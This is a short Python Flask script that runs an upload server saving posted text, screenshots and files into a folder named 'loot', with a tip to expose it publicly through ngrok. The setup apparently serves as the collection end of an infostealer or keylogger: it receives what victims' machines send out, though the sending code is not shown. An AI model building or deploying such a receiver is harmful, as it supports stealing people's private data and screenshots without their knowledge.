import os
from datetime import datetime
from flask import Flask, request

# ================== APP ==================
app = Flask(__name__)

# ================== FOLDER UPLOAD ==================
UPLOAD_FOLDER = os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot")
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# ================== ROUTE UPLOAD ==================
@app.route("/upload", methods=["POST"])
def upload():
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    print(f"[{timestamp}] Upload received")

    # Text
    testo = request.form.get("testo")
    if testo:
        log_file = os.path.join(UPLOAD_FOLDER, f"log_{timestamp}.txt")
        with open(log_file, "w", encoding="utf-8") as f:
            f.write(testo)
        print(f"[{timestamp}] Informations saved")

    # Screenshot
    screenshot = request.files.get("screenshot")
    if screenshot and screenshot.filename:
        img_file = os.path.join(
            UPLOAD_FOLDER,
            f"screen_{timestamp}.png"
        )
        screenshot.save(img_file)
        print(f"[{timestamp}] Screenshot saved")

    # Multiples txt files
    uploaded_files = request.files.getlist("files")

    for file in uploaded_files:
        if file and file.filename:
            safe_name = os.path.basename(file.filename)

            destination = os.path.join(
                UPLOAD_FOLDER,
                f"{timestamp}_{safe_name}"
            )

            file.save(destination)
            print(f"[{timestamp}] Saved file: {safe_name}")

    return "OK", 200


# ================== MAIN ==================
if __name__ == "__main__":
    print(
        "Server hosted and started on localhost:5000. "
        "Use NGROK <> to publish server."
    )
    app.run(host="0.0.0.0", port=5000)
